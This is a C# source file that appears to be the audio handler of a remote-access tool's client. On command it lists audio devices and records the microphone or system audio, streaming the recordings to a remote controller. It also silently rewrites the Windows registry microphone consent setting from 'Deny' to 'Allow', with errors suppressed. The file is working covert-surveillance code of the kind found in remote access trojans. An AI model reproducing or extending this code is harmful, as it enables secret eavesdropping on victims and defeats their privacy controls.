using AForge.Video.DirectShow;
using Comet.Common.Messages;
using Comet.Common.Networking;
using Comet.Common.Video;
using Microsoft.Win32;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Comet.Client.Messages
{
    internal class AudioHandler : NotificationMessageProcessor, IDisposable
    {
        static ISender _client;
        private IWaveIn system;
        internal WaveOut WaveOut = new WaveOut();
        private static WaveInEvent microphone;
        private static WasapiCapture capture;
        internal BufferedWaveProvider BufferedWaveProvider;

        public override bool CanExecute(IMessage message) => message is GetAudioNames||
                                                             message is GetAudioResponse||
                                                             message is DoAudioStop ||
                                                             message is SendMicrophoneInit ||
                                                             message is SendMicrophoneData ||
                                                             message is SendMicrophoneStop;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetAudioNames msg:
                    Execute(sender, msg);
                    break;
                case GetAudioResponse msg:
                    Execute(sender, msg);
                    break;
                case DoAudioStop msg:
                    Execute(sender, msg);
                    break;
                case SendMicrophoneInit msg:
                    Execute(sender, msg);
                    break;
                case SendMicrophoneData msg:
                    Execute(sender, msg);
                    break;
                case SendMicrophoneStop msg:
                    Execute(sender, msg);
                    break;
            }
        }
        

        private void Execute(ISender client, GetAudioNames message)
        {
            _client = client;
            GetAudioNames getAudioNames = new GetAudioNames
            {
                WaveInDeviceName = new List<string>()
            };
            for (int i = 0; i < WaveIn.DeviceCount; i++)
            {
                WaveInCapabilities deviceInfo = WaveIn.GetCapabilities(i);
                getAudioNames.WaveInDeviceName.Add(deviceInfo.ProductName + "@M");//添加麦克风
            }
            for (int i = 0; i < WaveOut.DeviceCount; i++)
            {
                WaveOutCapabilities deviceInfo = WaveOut.GetCapabilities(i);
                getAudioNames.WaveInDeviceName.Add(deviceInfo.ProductName + "@S");//添加系统播放设备
            }
            client.Send(getAudioNames);

            try
            {
                RegistryKey localMachineRegistry = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine,
                Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
                RegistryKey subKey = localMachineRegistry.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone", true);
                if (subKey != null)
                {
                    string str = (string)subKey.GetValue("Value");
                    if (str == "Deny") subKey.SetValue("Value", "Allow");
                }
            }
            catch (Exception)
            {
            }
        }

        private void Execute(ISender client, GetAudioResponse message)
        {
            switch (message.IsSystem)
            {
                case true:
                    
                    capture = new WasapiLoopbackCapture();
                    capture.DataAvailable += WaveDataAvailable;
                    capture.RecordingStopped += SystemWaveStop;
                    capture.StartRecording();
                    break;
                default:
                    microphone?.StopRecording();
                    microphone = new WaveInEvent();
                    microphone.WaveFormat = new WaveFormat(44100, 1);
                    microphone.DeviceNumber = 0;
                    microphone.DataAvailable += WaveDataAvailable;
                    microphone.RecordingStopped += MicWaveStop;
                    microphone.StartRecording();
                    break;
            }
        }
        
        void Execute(ISender client, SendMicrophoneInit message)
        {
            _client.Send(new SendMicrophoneInit());
            BufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(44100, 1));
            WaveOut.DeviceNumber = 0;
            WaveOut?.Init(BufferedWaveProvider);
            WaveOut?.Play();
        }

        void Execute(ISender client, SendMicrophoneData message)
        {
            BufferedWaveProvider?.AddSamples(message.Buffer, 0, message.BytesRecorded);
        }

        void Execute(ISender client, SendMicrophoneStop message)
        {
            WaveOut?.Stop();
            BufferedWaveProvider?.ClearBuffer();
        }

        void StopMic() 
        {
            microphone?.StopRecording();
        }

        private void Execute(ISender client, DoAudioStop message)
        {
            capture?.StopRecording();
            microphone?.StopRecording();
            WaveOut?.Stop();
            BufferedWaveProvider?.ClearBuffer();
        }

        void WaveDataAvailable(object sender, WaveInEventArgs e)
        {
            if (e.Buffer.Length>0 && e.BytesRecorded>0)
            {
                _client.Send(new GetAudioResponse
                {
                    Buffer = Encode(e.Buffer, 0, e.BytesRecorded),
                    BytesRecorded = e.BytesRecorded
                });
            }
        }
        byte[] Encode(byte[] data, int offset, int length)
        {
            var encoded = new byte[length];
            Array.Copy(data, offset, encoded, 0, length);
            return encoded;
        }

        void MicWaveStop(object sender, StoppedEventArgs e)
        {
            microphone.DataAvailable -= null;
            microphone.RecordingStopped -= null;
            microphone?.Dispose();
        }

        void SystemWaveStop(object sender, StoppedEventArgs e)
        {
            capture.DataAvailable -= null;
            capture.RecordingStopped -= null;
            capture?.Dispose();
        }

        //处置与此消息处理程序关联的所有托管和非托管资源。
        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }

    }
}
